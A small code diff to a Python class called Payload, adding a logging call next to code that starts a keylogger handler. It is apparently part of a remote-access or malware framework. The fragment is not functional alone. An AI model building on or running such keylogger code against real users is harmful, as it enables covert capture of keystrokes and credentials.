@@ -1031,6 +1031,7 @@ class Payload():
         else:
             if 'run' in mode or 'start' in mode:
                 if 'keylogger' not in self.handlers:
+                    log(globals()['keylogger'])
                     self.handlers['keylogger'] = globals()['keylogger'].run()
                     return locals()['status']()
                 else:
